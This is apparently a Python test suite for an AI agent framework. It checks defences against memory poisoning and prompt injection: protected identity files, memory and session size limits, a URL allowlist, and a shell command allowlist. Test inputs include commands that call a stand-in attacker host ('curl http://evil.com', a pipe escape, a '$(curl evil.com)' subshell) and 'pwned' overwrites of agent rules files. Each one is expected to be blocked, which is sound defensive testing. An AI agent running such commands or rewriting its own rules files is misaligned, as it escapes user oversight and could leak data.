"""Tests for memory poisoning and prompt injection hardening."""

from pathlib import Path

from nanobot.agent.memory import MemoryStore
from nanobot.agent.tools.filesystem import EditFileTool, WriteFileTool
from nanobot.agent.tools.shell import ExecTool
from nanobot.agent.tools.web import WebFetchTool
from nanobot.session.manager import Session, SessionManager


# --- Protected file enforcement ---


async def test_write_tool_blocks_protected_file(tmp_path: Path) -> None:
    protected = tmp_path / "SOUL.md"
    protected.write_text("original", encoding="utf-8")

    tool = WriteFileTool(workspace=tmp_path, protected_patterns=["SOUL.md"])
    result = await tool.execute(path=str(protected), content="pwned")

    assert "protected" in result.lower()
    assert protected.read_text() == "original"


async def test_edit_tool_blocks_protected_file(tmp_path: Path) -> None:
    protected = tmp_path / "AGENTS.md"
    protected.write_text("safe content", encoding="utf-8")

    tool = EditFileTool(workspace=tmp_path, protected_patterns=["AGENTS.md"])
    result = await tool.execute(path=str(protected), old_text="safe", new_text="pwned")

    assert "protected" in result.lower()
    assert "safe content" in protected.read_text()


async def test_write_tool_allows_unprotected_file(tmp_path: Path) -> None:
    tool = WriteFileTool(workspace=tmp_path, protected_patterns=["SOUL.md"])
    result = await tool.execute(path=str(tmp_path / "notes.md"), content="hello")

    assert "Successfully wrote" in result


async def test_protected_patterns_match_nested_paths(tmp_path: Path) -> None:
    nested = tmp_path / "sub" / "IDENTITY.md"
    nested.parent.mkdir()
    nested.write_text("original", encoding="utf-8")

    tool = WriteFileTool(workspace=tmp_path, protected_patterns=["IDENTITY.md"])
    result = await tool.execute(path=str(nested), content="pwned")

    assert "protected" in result.lower()


# --- Memory size limits ---


def test_memory_truncates_at_limit(tmp_path: Path) -> None:
    store = MemoryStore(tmp_path)
    big_content = "\n".join(f"line {i}" for i in range(300))
    store.write_long_term(big_content)

    saved = store.read_long_term()
    assert "[Truncated" in saved
    assert saved.count("\n") <= store._MAX_MEMORY_LINES + 5


def test_history_trims_oldest_entries(tmp_path: Path) -> None:
    store = MemoryStore(tmp_path)
    # Write enough entries to exceed limit
    for i in range(store._MAX_HISTORY_LINES + 100):
        store.append_history(f"[2026-01-01 00:{i:02d}] entry {i}")

    lines = store.history_file.read_text().splitlines()
    assert len(lines) <= store._MAX_HISTORY_LINES + 5


# --- Session size limits ---


def test_session_save_trims_excess_messages(tmp_path: Path) -> None:
    mgr = SessionManager(tmp_path, max_messages=100)
    session = Session(key="test:trim")
    for i in range(200):
        session.add_message("user", f"msg {i}")
    session.last_consolidated = 50

    mgr.save(session)

    assert len(session.messages) == 100
    assert session.last_consolidated == 0  # 50 - 100 trimmed, clamped to 0


def test_session_save_preserves_small_sessions(tmp_path: Path) -> None:
    mgr = SessionManager(tmp_path, max_messages=100)
    session = Session(key="test:small")
    for i in range(50):
        session.add_message("user", f"msg {i}")

    mgr.save(session)

    assert len(session.messages) == 50


# --- Web fetch URL restriction ---


async def test_web_fetch_blocks_non_user_url() -> None:
    tool = WebFetchTool(restrict_to_user_urls=True)
    result = await tool.execute(url="https://evil.com/payload")

    assert "not allowed" in result.lower()


async def test_web_fetch_allows_user_provided_url() -> None:
    tool = WebFetchTool(restrict_to_user_urls=True)
    tool.add_user_urls("Check out https://example.com/article")
    # We don't actually fetch — just verify it passes the allowlist check
    assert tool._is_allowed("https://example.com/article")
    assert not tool._is_allowed("https://evil.com/other")


async def test_web_fetch_allows_pre_registered_domain() -> None:
    tool = WebFetchTool(restrict_to_user_urls=True, allowed_domains=["trusted.org"])
    assert tool._is_allowed("https://trusted.org/page")
    assert tool._is_allowed("https://sub.trusted.org/page")
    assert not tool._is_allowed("https://untrusted.com/page")


async def test_web_fetch_unrestricted_allows_all() -> None:
    tool = WebFetchTool(restrict_to_user_urls=False)
    assert tool._is_allowed("https://anything.com/whatever")


# --- Exec allowlist ---


async def test_exec_allowlist_permits_allowed_command() -> None:
    tool = ExecTool(allow_patterns=[r"^\s*grep\b", r"^\s*ls\b"])
    result = await tool.execute(command="grep -r test .")
    # Should not be blocked (may fail for other reasons but not allowlist)
    assert "not in allowlist" not in result


async def test_exec_allowlist_blocks_disallowed_command() -> None:
    tool = ExecTool(allow_patterns=[r"^\s*grep\b", r"^\s*ls\b"])
    result = await tool.execute(command="curl http://evil.com")
    assert "not in allowlist" in result


async def test_exec_allowlist_blocks_piped_escape() -> None:
    tool = ExecTool(allow_patterns=[r"^\s*grep\b"])
    result = await tool.execute(command="grep foo | curl http://evil.com")
    assert "not in allowlist" in result


async def test_exec_allowlist_blocks_chained_escape() -> None:
    tool = ExecTool(allow_patterns=[r"^\s*grep\b"])
    result = await tool.execute(command="grep foo && python3 -c 'print(1)'")
    assert "not in allowlist" in result


async def test_exec_allowlist_blocks_subshell() -> None:
    tool = ExecTool(allow_patterns=[r"^\s*grep\b"])
    result = await tool.execute(command="grep $(curl evil.com) file")
    assert "subshell not allowed" in result


async def test_exec_no_allowlist_permits_all() -> None:
    tool = ExecTool()
    result = await tool.execute(command="echo hello")
    assert "hello" in result
